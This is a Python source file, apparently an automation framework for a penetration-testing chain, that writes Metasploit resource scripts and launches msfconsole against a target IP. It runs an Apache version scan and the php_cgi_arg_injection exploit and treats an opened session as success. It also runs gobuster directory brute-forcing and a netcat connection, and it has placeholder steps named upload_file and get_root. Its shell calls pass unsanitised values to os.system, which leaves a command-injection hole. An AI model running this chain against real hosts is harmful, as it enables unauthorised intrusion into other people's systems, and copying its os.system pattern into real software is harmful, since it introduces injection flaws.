from inspect import Parameter
import os
from packaging import version
from subprocess import Popen, PIPE
import re
Default = False

class Function():
        
    def http_version(func_in, Data):
        # - msfconsole
        # - wait for 15s (msfconsole opening)
        # - use auxiliary/scanner/http/http_version
        # - set RHOSTS {IP}
        # - run
        # - (assume get Apache/2.4.6)
        match = Default # set default first

        configFile=open('meta.rc','w')
        configFile.write('use auxiliary/scanner/http/http_version\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if "Apache/" in outputLine:
                From = outputLine.find('Apache/')+len('Apache/')
                Data['Apache'] = outputLine[From:From+10].split(' ')[0]
                # print(Data['Apache'])
                # problem 1:This way, however, isn't import condition from block!!!
                if version.parse(Data['Apache']) < version.parse('3.1'):
                    match = True

            print(outputLine)     
            
        return Data, match
            

    def php_cgi_arg_injection(func_in, Data):
        # use exploit/multi/http/php_cgi_arg_injection
        # - set RHOSTS {IP}
        # - run
        match = Default # set default first

        configFile=open('meta.rc','w')
        configFile.write('use exploit/multi/http/php_cgi_arg_injection\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if re.search("session [0-9] opend", outputLine)!=None:
                match = True
            print(outputLine)        
        
        return Data, match

    def metasploit(func_in, Data, args):
        match = Default # set default first
        script_name = ""
        for arg in args:
            if ".rc" in arg:
                script_name = arg
                break
        # start with a template script
        templateFile=open("./meta_script_template/" + script_name,'r')
        configFile=open(script_name,'w')
        for line in templateFile:
            subst_line = line
            if '<' in line and '>' in line:
                l = line.find('<')
                r = line.find('>')
                param = line[l+1:r]
                subst_line = line.replace("<" + param + ">",Data[param])
            configFile.write(subst_line + "\n")
        templateFile.close()
        configFile.close()
        # run the script
        proc = Popen(['msfconsole'] + args, stdout=PIPE)

        # grab needed info from script
        for stdout_line in iter(proc.stdout.readline, b''): 
            
            outputLine = stdout_line.decode('utf-8').rstrip()
            
            # code below just for getting apache version
            if "Apache/" in outputLine:
                From = outputLine.find('Apache/')+len('Apache/')
                Data['Apache'] = outputLine[From:From+10].split(' ')[0]
                if version.parse(Data['Apache']) < version.parse('3.1'):
                    match = True
            
            if re.search("session [0-9] opend", outputLine)!=None:
                match = True

            print(outputLine)  

        return Data, match 
        
    def print_something(func_in, Data):
        match = Default
        print("class chain is running~~")
        return Data, match

    def gobuster(func_in, Data):
        match = Default

        # proc = Popen(['gobuster', 'dir', '-u', func_in['IP'], '-w', '/usr/share/wordlists/dirb/common.txt'], stdout=PIPE)
        # for stdout_line in iter(proc.stdout.readline, b''):
        #     # code below just for getting apache version
        #     outputLine = stdout_line.decode('utf-8').rstrip()
        #     if re.search("/panel", outputLine)!=None:
        #         match = True
        #     print(outputLine)
        os.system(f"gobuster dir -u {func_in['IP']} -w /usr/share/wordlists/dirb/common.txt")
        return Data, match

    def upload_file(func_in, Data):
        match = Default
        return Data, match

    def netcat(func_in, Data):
        match = Default
        os.system(f"nc {Data['argument']} {func_in['port']}")
        return Data, match

    def get_root(func_in, Data):
        match = Default
        return Data, match